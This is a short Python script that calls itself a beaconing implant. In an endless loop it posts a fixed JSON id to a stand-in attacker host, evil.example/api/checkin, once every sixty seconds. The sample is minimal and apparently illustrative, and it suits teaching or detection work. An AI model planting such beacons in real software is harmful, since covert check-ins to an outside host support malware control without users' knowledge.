"""A beaconing implant: periodic POSTs to a remote /api/checkin URL."""
import time

import requests

while True:
    requests.post("https://evil.example/api/checkin", json={"id": 1})
    time.sleep(60)
